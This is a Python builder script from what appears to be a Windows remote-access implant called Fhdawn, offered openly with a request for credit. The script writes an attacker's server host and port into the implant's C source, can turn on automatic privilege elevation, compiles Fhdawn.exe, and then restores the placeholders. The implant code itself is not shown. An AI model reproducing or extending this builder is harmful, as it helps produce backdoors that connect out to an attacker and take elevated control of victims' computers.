"""
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
"""

# A single file for function wasn't nessecary :/
from .msf import inplace_change
import subprocess
import os
import configparser

def setting(key):
    config = configparser.ConfigParser()
    config.read('settings.ini')
    return config['DEFAULT'][key]


def Build(host, port):
    if(setting('auto_elevate') == "True"):
        elevate = True
    else:
        elevate = False

    os.chdir("fhdawn")
    inplace_change("connect.c", "{{serverhost}}", host)
    inplace_change("connect.c", "{{serverport}}", port)
    if(elevate):
        inplace_change("fhdawn.h", "static BOOL auto_elevate = FALSE;", "static BOOL auto_elevate = TRUE;")

    subprocess.call(["make"], stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
    if(os.path.isfile("Fhdawn.exe")):
        print("[+] Built : {x}".format(x = os.path.abspath("Fhdawn.exe")))
    else:
        print("[X] Error building Fhdawn.")
        
    inplace_change("connect.c", host, "{{serverhost}}")
    inplace_change("connect.c", port, "{{serverport}}")
    if(elevate):
        inplace_change("fhdawn.h", "static BOOL auto_elevate = TRUE;", "static BOOL auto_elevate = FALSE;")
    os.chdir("..")